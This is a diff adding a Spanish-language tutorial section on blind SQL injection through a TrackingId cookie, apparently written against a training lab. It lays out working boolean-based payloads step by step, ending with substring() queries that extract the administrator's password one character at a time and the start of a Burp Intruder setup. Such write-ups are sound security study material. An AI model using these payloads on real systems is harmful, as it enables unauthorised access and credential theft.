@@ -253,10 +253,117 @@ Lo mismo que en oracle, pero se utiliza otro comando
 $WORD' union select null,@@version-- -
 ````
 
+# ¿Qué es una Blind SQL | Inyección a ciegas?
+A la hora de aplicar la query **que no se vea el error**
+
+## Blind SQL - Injection with conditional responseve | conditional error
+
+En base a lo que tu pongas algunos componentes pueden desaparecer, pero los datos no los vas a ver en la web
+
+En este caso lo vamos a explotar en el valor de una cookie
+
+Recomiendo utilizar **Burpsuite** 
 
 
-[Vídeo de s4vi](https://www.youtube.com/watch?v=C-FiImhUviM&t=4400s) --> 1:33:30
+````html
+Cookie: TrackingId=F3uQfI06GsWBDMMy; session=bfNEMei3vCZyu84vqMjHZxUyWFViPbHK
+````
 
+![[Pasted image 20230125225841.png]]
+
+En el campo TrackingId si insertamos una comilla simple al final no nos muestra el Welcome back!
+
+````sql
+Cookie: TrackingId=F3uQfI06GsWBDMMy'; 
+````
+
+![[Pasted image 20230125225930.png]]
+
+En caso de que comentemos el resto, esto deja de funcionar y vuelve a mostrar el mensaje Welcome Back!
+Esto estaría mal:
+````sql
+Cookie: TrackingId=F3uQfI06GsWBDMMy'-- -;
+````
+
+Y si probamos el típico 1=1;
+````sql
+Cookie: TrackingId=F3uQfI06GsWBDMMy' AND 1=1-- -;
+````
+Esto no funcionaría
+
+En cambio si ponemos un resultado incorrecto, el mensaje vuelve a desaparecer:
+````sql
+Cookie: TrackingId=F3uQfI06GsWBDMMy' AND 2=1-- -;
+````
+![[Pasted image 20230125230351.png]]
+
+**En caso de no querer comentar** podemos hacerlo de la siguiente manera:
+````sql
+Cookie: TrackingId=F3uQfI06GsWBDMMy' AND '1'='1';
+````
+
+Como sabemos que hay una comilla al final, esta nos va a cerrar nuestra propia query
+
+
+Si queremos comprobarlo podemos hacer lo siguiente
+
+````sql
+Cookie: TrackingId=F3uQfI06GsWBDMMy' AND (select 'a')='a;
+````
+
+y nos tiene que salir la frase en este caso
+
+podemos añadir una subquery
+
+````sql
+Cookie: TrackingId=F3uQfI06GsWBDMMy' AND (select 'a' from users limit 1)='a;
+````
+Seleccionamos la letra a de la tabla users (que es la que contiene los usuarios)
+limit 1 --> Limitar el resultado en una única fila
+
+En caso **de que muestre** la a significa que un valor/nombre tiene dicha letra
+
+En caso **de que no muestre** la frase significa que no hay ningún valor/nombre con dicha letra
+
+Ahora vamos a atentar directamente contra el usuario administrator
+
+````sql
+Cookie: TrackingId=F3uQfI06GsWBDMMy' AND (select 'a' from users where username='administrator')='a;
+````
+
+Y igual que hemos visto anteriormente
+
+En caso de que salga la frase (el campo) nos esta indicando que es correcto, en este caso que existe
+
+Y si no sala es porque no existe o la query no es correcta
+
+Una forma más cómoda de utilzarlo es con la función substring()
+````sql
+Cookie: TrackingId=F3uQfI06GsWBDMMy' AND (select substring(username,1,1) from users where username='administrator')='a;
+````
+
+substring(username,1,1) --> De la fila username cogeme **desde la primera posición un carácter (el mismo)**
+
+
+Está query estaría verificando que el primer carácter de la contraseña de administrator sea la a
+
+Esto lo podemos hacer de una forma más óptima si fuzzeamos dicho campo
+
+````sql
+Cookie: TrackingId=F3uQfI06GsWBDMMy' AND (select substring(password,1,1) from users where username='administrator')='a;
+````
+
+Para ello **vamos a utilizar Python**
+
+Lo primero que vamos a hacer es mandarlo al intruder en burpsuite (Ctrl+I)
+
+Si se abren dos pestañas la primera la podemos cerrar, es la segunda
+
+#### Realización de ataque tipo Sniper
+
+Arriba a la izquierda nos pregunta que ataque queremos realizar, nosotros le indicamos Sniper porque vamos a estar utilizando **un único diccionario**
+
+[Vídeo de s4vitar](https://www.youtube.com/watch?v=C-FiImhUviM&t=5611s) --> 1:48:04
 
 # Herramientas de automatización
 Sqlmap
